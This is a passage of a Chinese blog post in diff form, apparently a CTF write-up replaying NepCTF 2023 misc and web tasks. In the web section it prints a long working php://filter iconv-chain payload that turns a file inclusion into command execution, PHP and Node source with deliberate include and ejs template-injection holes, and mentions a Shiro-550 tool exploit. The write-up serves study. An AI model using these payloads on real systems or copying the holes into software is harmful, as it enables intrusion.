+<span class="token keyword">print</span><span class="token punctuation">(</span>decrypted_text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="D:/Git/blog/myblog/source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/%E5%B0%8F%E5%8F%AE%E5%BD%93%E5%BC%B9%E9%92%A2%E7%90%B43.png"
+                     
+                ></p>
+<h3 id="陌生的纸条"><a href="#陌生的纸条" class="headerlink" title="陌生的纸条"></a>陌生的纸条</h3><p>下载文件后是这样一张图片</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="D:/Git/blog/myblog/source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/%E9%99%8C%E7%94%9F%E7%9A%84%E7%BA%B8%E6%9D%A1.jpg"
+                     
+                ></p>
+<p>出题人给了提示，小魔女学园里的一个人物，就一点点看番呗，看到第五集终于知道这玩意叫新月文字和古龙语。</p>
+<p>找对照表；<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="D:/Git/blog/myblog/source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/%E6%96%B0%E6%9C%88%E6%96%87%E5%AD%97.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="D:/Git/blog/myblog/source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/%E5%8F%A4%E9%BE%99%E8%AF%AD.png"
+                     
+                ></p>
+<p>对照得到flag，就离谱。</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ez-java-checkin"><a href="#ez-java-checkin" class="headerlink" title="ez_java_checkin"></a>ez_java_checkin</h3><p>看网上wp说是shiro550漏洞，可以以拿工具梭</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/shro1.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/shro2.png"
+                     
+                ></p>
+<h3 id="EZ-include"><a href="#EZ-include" class="headerlink" title="EZ_include"></a>EZ_include</h3><p>在<code>http://nepctf.1cepeak.cn:31475/jump.php?hint</code>路径下有源码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$jump_link</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'link'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$jump_link</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$jump_link</span><span class="token operator">.</span> <span class="token string double-quoted-string">".txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// More info? See "/var/www/html/hint.ini" or "./hint.ini"</span>
+    
+<span class="token punctuation">&#125;</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hint'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+<span class="token punctuation">&#125;</span>
+
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hint'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$jump_link</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+<span class="token delimiter important">?></span></span>
+所以到底来没来? 且看 /<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>?hint
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>有一个明显的文件包含，在看师傅的wp当中用法，得到：</p>
+<pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO-2022-KR.UTF16|convert.iconv.ISO-IR-139.UTF-16|convert.iconv.ISO-IR-157.ISO-IR-156|convert.iconv.WINDOWS-1258.ISO_6937|convert.iconv.KOI8-T.ISO-2022-JP-3|convert.iconv.CP874.ISO2022KR|convert.iconv.CSUNICODE.UTF-8|convert.iconv.OSF00010004.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode&#x2F;resource&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;tmp&#x2F;resources&#x2F;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/EZ_include.png"
+                     
+                ></p>
+<p>便可以命令执行</p>
+<p>能看懂的就到指令，接下来跟着大佬操作</p>
+<h3 id="Post-Crad-For-You"><a href="#Post-Crad-For-You" class="headerlink" title="Post Crad For You"></a>Post Crad For You</h3><p>考点：ejs模板注入</p>
+<pre class="line-numbers language-none"><code class="language-none">var path &#x3D; require(&#39;path&#39;);
+const fs &#x3D; require(&#39;fs&#39;);
+const crypto &#x3D; require(&quot;crypto&quot;);
+
+const express &#x3D; require(&#39;express&#39;)
+const app &#x3D; express()
+const port &#x3D; 3000
+
+templateDir &#x3D; path.join(__dirname, &#39;template&#39;);
+app.set(&#39;view engine&#39;, &#39;ejs&#39;);
+app.set(&#39;template&#39;, templateDir);
+
+function sleep(milliSeconds)&#123;
+    var StartTime &#x3D;new Date().getTime();
+    let i &#x3D; 0;
+    while (new Date().getTime() &lt;StartTime+milliSeconds);
+
+&#125;
+
+app.get(&#39;&#x2F;&#39;, function(req, res) &#123;
+    return res.sendFile(&#39;.&#x2F;index.html&#39;, &#123;root: __dirname&#125;);
+&#125;);
+
+app.get(&#39;&#x2F;create&#39;, function(req, res) &#123;
+    let uuid;
+    let name &#x3D; req.query.name ?? &#39;&#39;;
+    let address &#x3D; req.query.address ?? &#39;&#39;;
+    let message &#x3D; req.query.message ?? &#39;&#39;;
+    do &#123;
+        uuid &#x3D; crypto.randomUUID();
+    &#125; while (fs.existsSync(&#96;$&#123;templateDir&#125;&#x2F;$&#123;uuid&#125;.ejs&#96;))
+
+    try &#123;
+        if (name !&#x3D; &#39;&#39; &amp;&amp; address !&#x3D; &#39;&#39; &amp;&amp; message !&#x3D; &#39;&#39;) &#123;
+            let source &#x3D; [&quot;source&quot;, &quot;source1&quot;, &quot;source2&quot;, &quot;source3&quot;].sort(function()&#123;
+                return 0.5 - Math.random();
+            &#125;)
+            fs.readFile(source[0]+&quot;.html&quot;, &#39;utf8&#39;,function(err, pageContent)&#123;
+                fs.writeFileSync(&#96;$&#123;templateDir&#125;&#x2F;$&#123;uuid&#125;.ejs&#96;, pageContent.replace(&#x2F;--ID--&#x2F;g, uuid.replace(&#x2F;-&#x2F;g, &quot;&quot;)));
+                sleep(2000);
+            &#125;)
+        &#125; else &#123;
+            res.status(500).send(&quot;Params &#96;name&#96; or &#96;address&#96; or &#96;message&#96; empty&quot;);
+            return;
+        &#125;
+    &#125; catch(err) &#123;
+        res.status(500).send(&quot;Failed to write file&quot;);
+        return;
+    &#125;
+
+    return res.redirect(&#96;&#x2F;page?pageid&#x3D;$&#123;uuid&#125;&amp;name&#x3D;$&#123;name&#125;&amp;address&#x3D;$&#123;address&#125;&amp;message&#x3D;$&#123;message&#125;&#96;);
+&#125;);
+
+app.get(&#39;&#x2F;page&#39;, (req,res) &#x3D;&gt; &#123;
+    let id &#x3D; req.query.pageid
+    if (!&#x2F;^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-[4][0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;$&#x2F;i.test(id) || !fs.existsSync(&#96;$&#123;templateDir&#125;&#x2F;$&#123;id&#125;.ejs&#96;)) &#123;
+        res.status(404).send(&quot;Sorry, no such id&quot;)
+        return;
+    &#125;
+    res.render(&#96;$&#123;templateDir&#125;&#x2F;$&#123;id&#125;.ejs&#96;, req.query);
+&#125;)
+
+app.listen(port, () &#x3D;&gt; &#123;
+    console.log(&#96;App listening on port $&#123;port&#125;&#96;)
+&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这是源码</p>
+<p>知识点参考<a class="link"   target="_blank" rel="noopener" href="https://inhann.top/2023/03/26/ejs/" >https://inhann.top/2023/03/26/ejs/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/POSt1.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/POST2.png"
+                     
+                ></p>
+<p>可以得到flag。</p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Nepctf2023复现</li>
+        <li><strong>Author:</strong> 阿巴</li>
+        <li><strong>Created at:</strong> 2023-08-20 09:50:17</li>
+        
+            <li>
+                <strong>Updated at:</strong> 2023-08-20 09:54:36
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2023/08/20/Nepctf2023复现/
+        </li>
+        <li>
+            <strong>License:</strong> This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/web%E5%AE%89%E5%85%A8/">#web安全</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                            rel="prev"
+                            href="/2023/08/20/ctfshow%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"
+                            >
+                                <span class="left arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-left"></i>
+                                </span>
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item"></span>
+                                    <span class="post-nav-item">Prev posts</span>
+                                </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/08/20/ctfshow%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">ctfshow—命令执行</span>
+                                    <span class="post-nav-item">Next posts</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Nepctf2023复现</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Nepctf2023%E5%A4%8D%E7%8E%B0"><span class="nav-text">Nepctf2023复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#misc"><span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#code"><span class="nav-text">code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8EAI%E5%85%B1%E8%88%9E%E7%9A%84%E5%93%88%E5%A4%AB%E6%9B%BC"><span class="nav-text">与AI共舞的哈夫曼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E5%8F%AE%E5%BD%93%E5%BC%B9%E9%92%A2%E7%90%B4"><span class="nav-text">小叮当弹钢琴</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%99%8C%E7%94%9F%E7%9A%84%E7%BA%B8%E6%9D%A1"><span class="nav-text">陌生的纸条</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ez-java-checkin"><span class="nav-text">ez_java_checkin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EZ-include"><span class="nav-text">EZ_include</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Post-Crad-For-You"><span class="nav-text">Post Crad For You</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>Invalid date</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">阿巴</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        VISITOR COUNT&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        TOTAL PAGE VIEWS&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a></span>
+                <br>
+            <span class="theme-version-container">THEME&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.2.2</a>
+        </div>
+        
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+        
+            <script async data-pjax>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/navbarShrink.js"></script>
+
+<script src="/js/tools/scrollTopBottom.js"></script>
+
+<script src="/js/tools/lightDarkSwitch.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/tools/tocToggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax',
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            Global.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            Global.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            Global.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
